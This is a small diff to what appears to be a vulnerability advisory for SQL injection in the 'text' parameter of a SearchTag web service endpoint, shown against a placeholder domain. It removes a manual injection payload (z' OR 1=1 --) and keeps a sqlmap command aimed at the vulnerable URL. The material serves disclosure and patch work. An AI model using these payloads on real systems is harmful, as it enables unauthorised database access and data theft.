@@ -29,11 +29,8 @@ Patched version: 5.50.02.03
 
 
 ## Execution
-- Vulnerable GET parameter: domain.com/Services/Misc.asmx/SearchTag?text=SQLI 
-- PoC: 
-```
-domain.com/Services/Misc.asmx/SearchTag?text=z' OR 1=1 --
-```
+- Vulnerable *text* parameter via GET: domain.com/Services/Misc.asmx/SearchTag?text=SQLI 
+
 - PoC via sqlmap: 
 ```
 sqlmap -u https://domain.com/Services/Misc.asmx/SearchTag?text=a --dbms=DBMS --batch
